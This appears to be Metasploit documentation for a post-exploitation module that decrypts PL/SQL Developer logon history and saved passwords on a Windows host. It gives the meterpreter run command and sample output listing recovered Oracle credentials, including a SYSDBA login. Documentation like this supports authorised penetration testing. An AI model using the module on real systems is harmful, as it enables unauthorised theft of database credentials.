## Vulnerable Application

This module can decrypt the history of PL/SQL Deceloper, and passwords are available if the user chooses to remember the password.
Analysis of encryption algorithm [here](https://adamcaudill.com/2016/02/02/plsql-developer-nonexistent-encryption/).
You can find its official website [here](https://www.allroundautomations.com/products/pl-sql-developer/).

## Verification Steps

  1. Download and install PL/SQL Developer.
  2. (Optional) Change the PL/SQL Developer preference to save the passwords.
  3. Use PL/SQL Developer to log in to oracle databases.
  4. Get a `meterpreter` session on a Windows host.
  5. Do: ```run post/windows/gather/credentials/plsql_developer```
  6. The username, password (only when configured to save passwords), SID of logon histories will be printed.

## Options

 **PLSQL_PATH**

  - Specify the path of PL/SQL Developer

## Scenarios

```
meterpreter > run windows/gather/credentials/plsql_developer

[*] Gather PL/SQL Developer History and Passwords on WIN-XXXXXXXXXXX
[*] Decrypting C:\Users\Administrator\AppData\Roaming\PLSQL Developer\Preferences\Administrator\user.prefs
PL/SQL Developer History and Passwords
======================================

History
-------
sys/oracle@ORCL AS SYSDBA
test1/@ORCL
test2/password2@ORCL
user/password@server

[+] Passwords stored in: C:/Users/Administrator/.msf4/loot/20231026190630_default_127.0.0.1_host.plsql_devel_674990.txt
meterpreter >
```
